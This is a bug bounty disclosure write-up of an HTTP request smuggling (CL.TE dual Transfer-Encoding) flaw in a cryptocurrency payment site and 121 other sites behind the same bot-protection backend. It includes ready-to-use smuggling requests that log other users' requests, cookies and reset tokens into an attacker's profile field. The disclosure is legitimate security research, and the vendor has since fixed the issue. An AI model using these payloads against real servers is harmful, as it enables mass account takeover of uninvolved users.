# HTTP Desync Attack (Request Smuggling) - Mass Account Takeover at a Cryptocurrency based asset and 121 other websites

## Description -:

**NOTE** to respect the nondisclosure policy of the program, the actual vulnerable asset is not disclosed and the same has been referenced as `my.vulnerable.com` wherever necessary.

I had found an HTTP Desync (Request Smuggling) vulnerability affecting one of the cryptocurrency payment system (`https://my.vulnerable.com`) along with 121 other hosts utilizing the Distil Bot protection.

It was observed that the front end server is using the `Content-Length` while the back end server is making use of `Transfer-Encoding` header to determine the length of an HTTP request. This desynchronization in determining the length of request between the servers could be abused into escalating a Mass Account Takeover scenario by utilizing the POST parameters of urlencoded form to log requests of legit users.

## Proof of Concept - Basic -:

Please **NOTE** that in an effort to provide the key proof of concept in the most basic and realistic form, the entire demonstration was carried out by utilizing two different machines operating at two different public IP addresses (one to depict victim and other for attacker) by making the use of Burp's native intruder instead of Turbo intruder. It should also be noted that the following form of testing would cause realtime disruption against the genuine users and so during the submission of this report, the entire assessment was carried out within the staging environment instead of production systems. Inbuilt Burp's intruder could be utilized in such cases since the staging environment would suffer relatively low traffic.

1) As a victim, visit at `https://my.vulnerable.com` at your browser and intercept the GET request. Send it to Burp's repeater and observe you're getting an `HTTP/1.1 200 OK` response as usual as expected.

2) Now as an attacker, from a different public IP address, have the following ambiguous request kept at one of your Burp's repeater tab -:

```http
POST / HTTP/1.1
Host: my.vulnerable.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://my.vulnerable.com/
Cookie: ******************
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Transfer-Encoding: chunked
Transfer-encoding: identity

0

TRACE /hopefully405 HTTP/1.1
X-Ignore: X
```

3) Now at the victim's machine, send the request to Burp's intruder and replay it there for about 200-300 times.

4) Simultaneously within this meantime, keep on replaying the attacker's request at repeater. Keep replaying till the time intruder has finished 200/300 requests.

5) Observe the presence of some unusual `HTTP/1.1 405 Not Allowed` responses containing `hopefully405` within the response body, instead of expected `HTTP/1.1 200 OK` within the Intruder table of victim's machine -:

![1](https://user-images.githubusercontent.com/58471667/190241591-6e88606f-5ec1-4e61-b438-655f23457f40.png)

## Proof of Concept - Logging Mass HTTP requests of users at `https://my.vulnerable.com` -:

Now one of the consequences of the above vulnerability is that an attacker can leverage it to log mass user requests. Before proceeding, let's understand one of the basic functionality of `https://my.vulnerable.com`, which is if I make a POST request as -:

```http
POST /user/vendor/legal HTTP/1.1
Host: my.vulnerable.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://my.vulnerable.com/user/vendor/legal
Content-Type: application/x-www-form-urlencoded
Content-Length: 399
Connection: close
Cookie: ******************
Upgrade-Insecure-Requests: 1

user_vendor_legal%5Bname%5D=xxxxxx&user_vendor_legal%5Baddress%5D=blahblah&user_vendor_legal%5Btype%5D=individual&user_vendor_legal%5BrepFirstName%5D=xxxxxxx&user_vendor_legal%5BrepLastName%5D=xxxxxx&user_vendor_legal%5Btelephone%5D=xxxxxxxx&user_vendor_legal%5Bterms%5D=1&user_vendor_legal%5Bnda%5D=1&user_vendor_legal%5Bsave%5D=&user_vendor_legal%5B_token%5D=YxqzJ2bDMvSMO8fZXRPcntK7bj3X0X31w7KlUmCLgcw
```

Then if I navigate at `https://my.vulnerable.com/user/vendor/legal` I can see the value of `Business Address` field being saved there (in this case it's `blahblah`).

This simply means, if I put the `user_vendor_legal%5Baddress%5D` param at the end of the POST body and make a request like this -:

```http
POST / HTTP/1.1
Host: my.vulnerable.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://my.vulnerable.com/
Cookie: ******************
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 1783
Transfer-Encoding: chunked
Transfer-encoding: identity

0

POST /user/vendor/legal HTTP/1.1
Host: my.vulnerable.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://my.vulnerable.com/user/vendor/brand/5e9017a29006a
Content-Type: application/x-www-form-urlencoded
Content-Length: 1700
Connection: close
Cookie: ******************
Upgrade-Insecure-Requests: 1

user_vendor_legal%5Bname%5D=xxxxxx&user_vendor_legal%5Btype%5D=individual&user_vendor_legal%5BrepFirstName%5D=xxxxxxx&user_vendor_legal%5BrepLastName%5D=xxxxxx&user_vendor_legal%5Btelephone%5D=xxxxxxxx&user_vendor_legal%5Bterms%5D=1&user_vendor_legal%5Bnda%5D=1&user_vendor_legal%5Bsave%5D=&user_vendor_legal%5B_token%5D=YxqzJ2bDMvSMO8fZXRPcntK7bj3X0X31w7KlUmCLgcw&user_vendor_legal%5Baddress%5D=
```

Please NOTE that above is a single request (not multiple) that attacker would initiate. Observe the last param `user_vendor_legal%5Baddress%5D` at the end of the POST body. Means, after making this above ambiguous request, whosoever be the next legit user, making any GET or POST request, then their GET/POST request would get appended as the value of last `user_vendor_legal%5Baddress%5D` param of smuggled request. Afterwards, when the attacker will navigate to `https://my.vulnerable.com/user/vendor/legal` then he/she will see victim's HTTP request being logged as `Business Address` within his/her `Legal Entity` section -:

![2](https://user-images.githubusercontent.com/58471667/190241598-b0fe3c69-6261-4710-9e9c-792c29ccb0e9.png)

![3](https://user-images.githubusercontent.com/58471667/190241602-60bd765f-095a-4271-8f82-24d7d8e18658.png)

Above screenshots shows one of the logged HTTP POST request of any random user captured during the assessment. Observe the presence of token value of the user within their `X-D-Token` request header.


## Proof of Concept - Logging Mass HTTP requests of 121 other websites behind 192.225.xxx.x -:

While testing the logging of requests, by making them saved at my `Legal Entity` section of `https://my.vulnerable.com/user/vendor/legal`, I observed that I was getting saved with user's request meant for many other hosts as well such as `www.******.com`, `www.*****.be`, `api.******.com` etc. All these belonged to other organizations different from the target program.

Then I observed that all above hosts including `my.vulnerable.com` are pointing to the same IP of `192.225.xxx.x` which belongs to Distil Networks, a leading Bot manager (now acquired by Imperva). This simply meant that not only for `my.vulnerable.com` but we can steal/log user requests of all the applications behind `192.225.xxx.x` utilizing the common backend. Whois reverse IP lookup said that there are `121` other websites using `192.225.xxx.x`.

![4](https://user-images.githubusercontent.com/58471667/190241570-b33c1b49-bb5e-4623-8806-a05e7f60c561.png)

Above screenshots shows one of the logged HTTP GET request of any random user captured during the assessment. Observe the Host of captured request is `www.****.com` which is different from `my.vulnerable.com`.

Similarly, I was able to log following requests in the form of POST data. Observe the presence of cookies in some these requests -:

```
GET /favicon.ico HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like GeckoHost: www.******.beConnection: Keep-AliveCookie: __gfp_64b=c15nPXPLAcNx_df6U9Q5ZFIe9BHtz7
```

```
GET /api/suggest/where?term=Br HTTP/1.1Host: www.******.beAccept-Language: nl-nlAccept-Encoding: gzip, deflate, brCookie: adheseTestCookie=; euconsent=BOxonYdOxonYdAPABANLDF-AAAAvJ7_______9______9uz_Ov_v_f__33e8__9v_l_7_-___u_-33d4u_1vf99yfm1-
```

```
POST /ngx_pagespeed_beacon?url=http://www.******.com/codes/ever-wish.com?key=11436251019981 HTTP/1.1Host: www.******.comAccept: */*Accept-Language: en-auAccept-Encoding: br, gzip, deflateContent-Type: application/x-www-form-urlencoded
```

```
GET /api/v2/wants/is_wanted?gameVariantCode=ACE COMBAT 7 SKIES UNKNOWN Deluxe - PC HTTP/1.1Host: api.************.comConnection: Keep-AliveAccept-Encoding: gzipCF-IPCountry: GBX-Forwarded-For: 255.3.21.89, 162.158.159.101CF-RAY: 581b846bb22
``` 

Upon this I stumbled on a thought that if by making use of `my.vulnerable.com`, an attacker is capable of logging requests of other `121` websites behind the Distil, then whether the vice versa would also be possible ? Whether an attacker can make use of their input fields to entirely log the requests of `my.vulnerable.com` users.

So I randomly went to one of the `www.******.com` and found that it is also vulnerable to the exact same `CL.TE` based vulnerability by which the `my.vulnerable.com` is, which is a `CL.TE dualchunk left alive` HTTP Request Smuggling vulnerability, where two `Transfer Encoding` headers are specified in the attack request like this -:

`Transfer-Encoding: chunked`  
`Transfer-encoding: identity`  

See the following Turbo Intruder PoC screenshot for `www.******.com` -:

![5](https://user-images.githubusercontent.com/58471667/190241578-0d59f5cb-20fa-415b-b3bd-8aa86d280cef.png)

![6](https://user-images.githubusercontent.com/58471667/190241585-aca6afec-75d4-4247-aec3-b97754c56bf2.png)

I Emailed the `www.******.com` support team regarding the vulnerability and informed them to fix it up before a bad guy could exploit it.

## Challenges -:

Now one of the challenges faced during the assessment was that I'm only able to log the first 255 characters of a user's HTTP request. This is because there is a server side input length validation for the `user_vendor_legal%5Baddress%5D` parameter which does NOT allow saving a string of more than 255 characters. To workaround this, there were two solutions -:

#### Solution #1

During my assessment, I didn't look around the `Send`, `Exchanges` etc functionalities. There may exist any POST field which would allow saving of more than 255 characters. Secondly, I registered a free account. There maybe other account types which may have more functionalities and so there might be any input field which would allow saving of more than 255 characters.

But instead of looking around the account type alternatives or utilizing more time in exploring the `Send`, `Exchanges` etc functionalities, I thought to submit this report anyways. Because even with the current scenario along with this restriction, exploitability of the attack is not much affected, and following damage can still be done which I think is enough to assess the severity of the reported issue -:

i) Logging users Password reset requests because it's a GET request of the form -:

```http
GET /resetting/reset/bHqaPHME_6OHhVoh83GzHdcO1xlIUYKOUBav2h81fAE HTTP/1.1
Host: my.vulnerable.com
```

And the relevant data (reset token) comes within the first 255 characters.

ii) Logging users PIN reset requests because it's a GET request of the form -:

```http
GET /reset-pin/TjyF38YZtj4czo87A6TcZgL4W2J7sw6e-idwMLxVSXM HTTP/1.1
Host: my.vulnerable.com
```

And the relevant data (reset token) comes within the first 255 characters.

iii) Logging other GET requests containing sensitive Token values. For example, earlier while browsing at `my.vulnerable.com`, I observed this request -:

```http
GET /api/wallet?token=47_l-fHRtT3NXy6KOG6x17OUvqR0JaHuymdF6lLF_0M HTTP/1.1
Host: my.vulnerable.com
```

This token can also be stolen, as it comes within the first 255 characters.

iv) Similarly, while connecting or signing in with `my.vulnerable.com` from `task.vulnerable.com`, following request is generated -:

```http
GET /sso/redacted?sso=bm9uY2U9MjAyMC0wNC0xMVQwNzoyMDozMi45MzQyMzA%253D&sig=cba206bcd64808d5a67f528adb8b633f43d110ea3da08064dd81dee786506bfd HTTP/1.1
Host: my.vulnerable.com
```

So these values of `sso` & `sig` parameters can also be stolen (where `task.vulnerable.com` is an another asset of the same organization).

v) And obviously as demonstrated earlier, sensitive header or cookie value from within the request can also be accessed, if it falls within the first 255 characters.

#### Solution #2

Let us assume that there is no input field in the `my.vulnerable.com` which allows more than 255 characters. But interestingly, as demonstrated in the previous section that if by making the use of `my.vulnerable.com` an attacker is capable of logging requests of other `121` websites, and on the other hand vice versa is also possible. Means, if there is any input field which allows saving of more than 255 characters in any of those other 121 hosts, then an attacker can make use of them to entirely log the requests of `my.vulnerable.com` users along with the full cookie header.


## Impact -:

The interesting part of this vulnerability is, no user (victim) interaction is required. Any victim from anywhere will simply request `https://my.vulnerable.com` or any of those 121 websites but still their session would be hijacked. Another thing is that in this manner an attacker can log an enormous number of users HTTP requests on the web. All that an attacker needs to do is just make the above request exhibiting ambiguity, wait for a second or two, check your `Legal Entity` section at `https://my.vulnerable.com/user/vendor/legal` and every time you will see someone's cookies and tokens logged in there.

## References -:

1) `https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn`
2) `https://portswigger.net/research/http2`

## Reward -:

Severity assigned : P1 or Critical  
Bounty assigned : $4,300

![7](https://user-images.githubusercontent.com/58471667/190247022-debd5bd2-963b-4322-b0b9-4346bb50fa50.png)

(**NOTE** that this finding was a result of Distil Bot protection being vulnerable to HTTP Desync attacks back in 2020. Later on the issue was fixed by the vendor itself and now any HTTP request exhibiting ambiguity is rejected.)

*Find me on [@AnkitCuriosity](https://twitter.com/AnkitCuriosity) for more updates!*
